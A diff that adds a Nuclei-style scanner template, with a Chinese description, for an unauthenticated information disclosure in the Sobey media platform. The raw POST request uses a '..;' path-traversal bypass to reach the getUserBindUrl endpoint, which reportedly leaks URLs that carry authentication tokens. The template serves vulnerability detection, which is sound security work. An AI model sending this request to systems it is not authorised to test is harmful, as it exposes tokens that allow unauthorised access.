@@ -1,0 +1,35 @@
+id: sobeylingyun-getUserBindUrl-disclosure
+info:
+  name: 索贝融媒体 /mch/thirdPlatToto/getUserBindUrl 信息泄露
+  author: leadlife
+  severity: high
+  description: 索贝融媒体是一款由成都索贝数码科技股份有限公司开发的综合性融媒体解决方案与平台，广泛应用于各级电视台和媒体机构，旨在实现互联网与电视内容的融合生产、管理与分发，为媒体业务运营提供全面的支撑。该漏洞存在于索贝融媒体系统的 /mch/thirdPlatToto/getUserBindUrl 接口中。未经授权的访问者通过直接访问此接口，即可触发信息泄露。此漏洞可能导致系统内部敏感信息的泄露，特别是能够获取到包含认证令牌（token）的系统URL。攻击者一旦获取这些带有有效令牌的URL，便可能利用这些信息绕过身份验证机制，进一步访问受保护的系统资源或执行未经授权的操作，从而对系统的安全性构成潜在威胁。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/xhfd90ggggg1gunv
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: sobeylingyun,disclosure
+
+http:
+  - raw:
+      - |
+        POST /sobey-mchEditor/js/..;/mch/thirdPlatToto/getUserBindUrl HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 16
+
+        siteCode=&token=
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(header,'application/json','Sobey')
+        condition: and
